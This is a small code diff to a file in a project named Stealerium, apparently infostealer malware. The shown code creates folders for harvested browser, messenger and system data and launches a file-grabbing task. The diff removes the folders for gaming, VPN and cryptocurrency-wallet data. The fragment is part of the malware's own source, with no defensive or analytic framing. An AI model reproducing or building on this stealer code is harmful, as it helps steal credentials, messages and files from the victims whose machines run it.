@@ -44,10 +44,7 @@ namespace Stealerium.Helpers
 
                 Directory.CreateDirectory(browserPath);
                 Directory.CreateDirectory(messengerPath);
-                Directory.CreateDirectory(gamingPath);
                 Directory.CreateDirectory(systemPath);
-                Directory.CreateDirectory(vpnPath);
-                Directory.CreateDirectory(walletsPath);
 
                 // Multi-threaded task: Grabbing files
                 tasks.Add(CreateTask(() => FileGrabber.Run(sSavePath + "\\Grabber")));
